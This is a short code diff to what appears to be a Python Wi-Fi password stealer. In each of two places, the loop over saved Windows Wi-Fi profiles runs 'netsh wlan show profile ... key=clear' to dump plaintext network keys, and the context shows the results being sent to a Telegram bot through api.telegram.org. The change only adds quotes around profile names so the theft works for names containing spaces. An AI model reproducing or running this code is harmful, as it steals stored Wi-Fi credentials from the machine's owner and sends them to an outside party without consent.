@@ -51,7 +51,7 @@ def wifi():
 
 # Loop for every profile name
     for i in show_profile:
-        key = subprocess.getoutput("netsh wlan show profile " + i + " key=clear")
+        key = subprocess.getoutput(f"netsh wlan show profile \"{i}\" key=clear")
                         
 # Send data to Telegram_bot
         url = "https://api.telegram.org/bot{}/sendMessage".format(token)
@@ -95,7 +95,7 @@ else:
 
     # for_loops for every time run with different profile name
         for i in show_profile:
-            key = subprocess.getoutput("netsh wlan show profile "+i+ " key=clear")
+            key = subprocess.getoutput(f"netsh wlan show profile \"{i}\" key=clear")
             # print(key)
 
         # set token & id Telegram_bot in blank places 
